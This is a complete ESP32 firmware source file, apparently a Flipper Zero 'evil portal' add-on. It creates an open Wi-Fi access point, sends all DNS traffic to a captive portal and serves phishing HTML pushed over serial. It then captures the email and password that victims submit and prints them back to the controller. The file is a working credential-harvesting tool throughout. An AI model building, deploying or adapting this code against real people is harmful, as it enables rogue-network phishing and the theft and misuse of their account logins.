#include "ESPAsyncWebServer.h"
#include <AsyncTCP.h>
#include <DNSServer.h>
#include <WiFi.h>

#define B_PIN 4
#define G_PIN 5
#define R_PIN 6

#define WAITING 0
#define GOOD 1
#define BAD 2

#define SET_HTML_CMD "sethtml="
#define SET_AP_CMD "setap="
#define RESET_CMD "reset"
#define START_CMD "start"
#define ACK_CMD "ack"

// GLOBALS
DNSServer dnsServer;
AsyncWebServer server(80);

bool runServer = false;

String user_name;
String password;
bool name_received = false;
bool password_received = false;

// Ap name length can be maximum 32, make the buffer 33 to include the
// null terminator character.
char apName[33] = "";
String index_html;

// RESET
void (*resetFunction)(void) = 0;

// AP FUNCTIONS
class CaptiveRequestHandler : public AsyncWebHandler {
public:
  CaptiveRequestHandler() {}
  virtual ~CaptiveRequestHandler() {}

  bool canHandle(AsyncWebServerRequest *request) { return true; }

  void handleRequest(AsyncWebServerRequest *request) {
    request->send_P(200, "text/html", index_html.c_str());
  }
};

void setLed(int i) {
  if (i == WAITING) {
    digitalWrite(B_PIN, LOW);
    digitalWrite(G_PIN, HIGH);
    digitalWrite(R_PIN, HIGH);
  } else if (i == GOOD) {
    digitalWrite(B_PIN, HIGH);
    digitalWrite(G_PIN, LOW);
    digitalWrite(R_PIN, HIGH);
  } else {
    digitalWrite(B_PIN, HIGH);
    digitalWrite(G_PIN, HIGH);
    digitalWrite(R_PIN, LOW);
  }
}

void setupServer() {  
  server.on("/", HTTP_GET, [](AsyncWebServerRequest *request) {
    request->send_P(200, "text/html", index_html.c_str());
    Serial.println("client connected");
  });

  server.on("/get", HTTP_GET, [](AsyncWebServerRequest *request) {
    String inputMessage;
    String inputParam;

    if (request->hasParam("email")) {
      inputMessage = request->getParam("email")->value();
      inputParam = "email";
      user_name = inputMessage;
      name_received = true;
    }

    if (request->hasParam("password")) {
      inputMessage = request->getParam("password")->value();
      inputParam = "password";
      password = inputMessage;
      password_received = true;
    }
    request->send(
        200, "text/html",
        "<html><head><script>setTimeout(() => { window.location.href ='/' }, 100);</script></head><body></body></html>");
  });
  Serial.println("web server up");
}

void startAP() {
  Serial.print("starting ap ");
  Serial.println(apName);

  WiFi.mode(WIFI_AP);
  WiFi.softAP(apName);

  Serial.print("ap ip address: ");
  Serial.println(WiFi.softAPIP());

  setupServer();

  dnsServer.start(53, "*", WiFi.softAPIP());
  server.addHandler(new CaptiveRequestHandler()).setFilter(ON_AP_FILTER);
  server.begin();
}

bool checkForCommand(char *command) {
  bool received = false;
  if (Serial.available() > 0) {
      String flipperMessage = Serial.readString();
      const char *serialMessage = flipperMessage.c_str();
      int compare = strncmp(serialMessage, command, strlen(command));
      if (compare == 0) {
        received = true;
      }
  }
  return received;
}

void getInitInput() {
  // wait for html
  Serial.println("Waiting for HTML");
  bool has_ap = false;
  bool has_html = false;
  String flipperMessage;
  unsigned long last_reception = 0;

  while (!has_html || !has_ap) {
      if (Serial.available() > 0) {
        // Save the current reception timestamp.
        last_reception = millis();
        flipperMessage += Serial.readString();
        // Check if we have received the terminator character.
        if (!flipperMessage.endsWith("\n")) {
            continue;
        }

        // We received the whole command, remove the terminator character.
        flipperMessage.remove(flipperMessage.length() - 1);

        if (flipperMessage.indexOf(SET_HTML_CMD) == 0) {
          index_html = flipperMessage.substring(strlen(SET_HTML_CMD));
          has_html = true;
          Serial.println("html set");
        } else if (flipperMessage.indexOf(SET_AP_CMD) == 0) {
          size_t cmd_len = strlen(SET_AP_CMD);
          size_t to_copy_bytes = flipperMessage.length() - cmd_len;
          if (to_copy_bytes > 0) {
              if (to_copy_bytes > 32) {
                  // Truncate AP name longer then 32 characters.
                  to_copy_bytes = 32;
              }
              // Copy the ap name to the apName buffer.
              const char *ap_name_start = flipperMessage.c_str() + cmd_len;
              snprintf(apName, sizeof(apName), "%s", ap_name_start);

              has_ap = true;
              Serial.println("ap set");
          }
        } else if (flipperMessage.indexOf(RESET_CMD) == 0) {
          resetFunction();
        }

        // Clear the string after processing the command.
        flipperMessage.clear();
      } else if (flipperMessage.length() > 0 && millis() - last_reception > 100) {
        // If we have a dangling command for more than 100ms clear flipperMessage.
        flipperMessage.clear();
        Serial.println("reception timed out");
      }
  }
  Serial.println("all set");
}

void startPortal() {
  // wait for flipper input to get config index
  startAP();

  runServer = true;
}

// MAIN FUNCTIONS
void setup() {

  // init LED pins
  pinMode(B_PIN, OUTPUT);
  pinMode(G_PIN, OUTPUT);
  pinMode(R_PIN, OUTPUT);

  setLed(WAITING);

  Serial.begin(115200);

  // wait for init flipper input
  getInitInput();

  setLed(GOOD);

  startPortal();
}

void loop() {
  dnsServer.processNextRequest();
  if (name_received && password_received) {
    name_received = false;
    password_received = false;
    String logValue1 =
        "u: " + user_name;
    String logValue2 = "p: " + password;
    Serial.println(logValue1);
    Serial.println(logValue2);
  }
  if(checkForCommand(RESET_CMD)) {
    Serial.println("reseting");
    resetFunction();
  }  
}
